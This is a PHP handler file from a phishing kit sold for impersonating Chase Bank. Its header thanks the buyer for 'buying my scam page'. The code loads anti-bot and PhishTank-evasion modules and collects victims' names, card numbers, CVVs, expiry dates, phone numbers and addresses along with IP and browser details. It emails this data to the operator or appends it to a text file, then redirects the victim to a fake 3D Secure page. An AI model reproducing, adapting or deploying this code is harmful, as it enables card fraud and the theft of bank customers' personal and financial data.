<?php
/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
icq =>  ElZero
telegram => @Coder_seller
Site => elzeroSite.com <SOON> 
Thanks For Buying My Scam Page
Copyright all Reserved to El Zero
*/
session_start();
error_reporting(0);

require("../ElZero.php");
require '../function.php';
//AntiBot By ElZero ICQ: @ElZero
require ("../../antibots/antibot_ip.php");
require ("../../antibots/antibot_userAgent.php");
require ("../../antibots/antibot_host.php");
require ("../../antibots/antibot_phishtank.php");
require ("../../antibots/antibot_proxy.php");
require ("../../antibots/someBots.php");
require ("../../antibots/ipQualityScore.php");
require ("../../antibots/antibot_blacklist.php");
if (!empty($_POST['elzeroKiller']) && isset($_POST['elzeroKiller'])) {
	header("Location: ".randomURl());exit();
}

if ($_POST['tokenElzeroCsrf'] == $_SESSION['ElZeR0_ToKeN']) {
	if (isset($_POST['fullName']) && isset($_POST['cc']) && isset($_POST['CVV']) ) {
		if (!empty($_POST['fullName']) && !empty($_POST['cc']) && !empty($_POST['CVV'])) {
			if (badWord($_POST['fullName']) == true) {
				$cc = $_POST['cc'];
				$expiration1 = $_POST['expDate'];
				$check = check_cc($cc);
				$expir = checkExpDate($expiration1);
				//Check Credit Card And Ecpireation Date By ElZero ICQ: @ElZero
				if($check!==false && $expir == $_POST['expDate']){
					$sendToEmail = strtolower($sendToEmail);
					$expDate = $_POST['expDate'];
					$_SESSION['fullName'] = $_POST['fullName'];
					$NewCC = get4Digit($_POST['cc']);
					$_SESSION['credit'] = $NewCC;

					/* Start Session Panel */
					$_SESSION['fullName'] = $_POST['fullName'];
					$_SESSION['card'] = $_POST['cc'];
					$_SESSION['CVV'] = $_POST['CVV'];
					$_SESSION['expDate'] = $_POST['expDate'];
					$_SESSION['phoneNumber'] = $_POST['phoneNumber'];
					$_SESSION['streetAddress'] = $_POST['streetAddress'];
					$_SESSION['city'] = $_POST['city'];
					$_SESSION['zipCode'] = $_POST['zipCode'];

					/* End Session Panel */

					/*Message*/
					$MSG  = "XxXxXxXxXxXx<(0)> Chase Bank Info  <(0)>XxXxXxXxXxXx \r\n";
					$MSG .= "XxXxXxXxXxXx<(0)> El Zero Scam Page <(0)>XxXxXxXxXxXx \r\n";
					$MSG .= "Full Name : ".$_POST['fullName']."\r\n";
					$MSG .= "Credit Card : ".$_POST['cc']."\r\n";
					$MSG .= "cvv : ".$_POST['CVV']."\r\n";
					$MSG .= "expiration Date : ".$_POST['expDate']."\r\n";
					$MSG .= "Phone Number : ".$_POST['phoneNumber']."\r\n";
					$MSG .= "Street Address : ".$_POST['streetAddress']."\r\n";
					$MSG .= "city : ".$_POST['city']."\r\n";
					$MSG .= "zip Code : ".$_POST['zipCode']."\r\n";
					$MSG .= "XxXxXxXxXxXx<(0)>  Ip & Some Info  <(0)>XxXxXxXxXxXx \r\n";
					$MSG .= "IP :".$_SESSION['ip']."\r\n";
					$MSG .= "Browser : ".$Browser."\r\n";
					$MSG .= "User Agent : " .$_SERVER['HTTP_USER_AGENT']."\r\n";
					$MSG .= "Country :".$_SESSION["country"]."\r\n";
					$MSG .= "Currency :".$_SESSION["currency"]."\r\n";
					$MSG .= "Country Code : ".$_SESSION["Country_code"]."\r\n" ;
					$MSG .= "XxXxXxXxXxX<(0)> El Zero Scam Page <(0)>xXxXxXxXxXx \r\n";
					$MSG .= "XxXxXxXxXxX<(0)> Thanks For Buying <(0)>xXxXxXxXxXx \r\n";
					/*End Message*/
					$_SESSION['sessionInfoElZeroSecure'] = "ElZero Session Info";
					if ($sendToEmail == "true") {
						
						$subject = "Chase \xF0\x9F\x94\xA5[ElZero]\xF0\x9F\x94\xA5 Card & Info => ".$expDate." from ".$_SESSION_['ip'];
						$Browser = getBrowser();
						
						send($yourEmail,$subject,$MSG);
					}
					$saveInText = strtolower($saveInText);
					if ($saveInText == "true") {
						$Browser = getBrowser();
						/*Message*/
						$file = fopen("../../".$textName.".txt","a+");
						fwrite($file, $MSG);
						fclose($file);
					}
					// $Block_page = strtolower($Block_page);
					header("Location: ../../secure/3dsecure?id=chase&country=us");exit();
						// echo "Forth Page";
				}else{
					// echo "Test";
					header("Location: ../../secure/verifyInfo?id=chase&country=us&invalid");exit();
				}
			}else{
				// echo "BadWords";
				header("Location: ../../secure/verifyInfo?id=chase&country=us&invalid");exit();
			}
		}else{
			// echo "Empty";
			header("Location: ../../secure/verifyInfo?id=chase&country=us&invalid");exit();
		}
	}else{
		// echo "Isset";
		header("Location: ../../secure/verifyInfo?id=chase&country=us&invalid");exit();
	}
}else{
		// echo 'Token';
		
	if (isset($_SESSION['emailGrabber']) ) {
		header("Location: ../../?email=".$_SESSION['emailGrabber']);exit();
	}else{
		header("Location: ../../");exit();
	}
	
}